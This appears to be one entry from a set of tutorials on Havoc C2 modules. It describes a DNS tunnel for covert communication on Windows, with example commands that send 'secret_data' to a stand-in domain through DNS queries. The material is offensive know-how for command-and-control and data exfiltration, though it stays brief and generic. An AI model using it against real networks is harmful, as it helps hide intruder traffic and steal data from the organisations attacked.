
---

#### **9. DNS Tunnel**

**File**: `DNS_Tunnel.md`

# Establishing a DNS Tunnel for Covert Communication

## Description
This tutorial explains how to use the **DNS Tunnel** module to establish covert communication using DNS queries.

## Requirements
- **Operating System**: Windows.
- **Havoc C2**: The DNS Tunnel module must be loaded.

## Steps
1. **Preparation**:
   - Load the **DNS Tunnel** module in Havoc C2.

2. **Execution**:
   - Use the command `send_dns_query [domain] [data]` to send data through a DNS query.
   - Use the command `receive_dns_response [domain]` to receive data through a DNS response.

3. **Verification**:
   - Verify the data transmission by checking the output.

## Example Commands
```bash
send_dns_query "example.com" "secret_data"
receive_dns_response "example.com"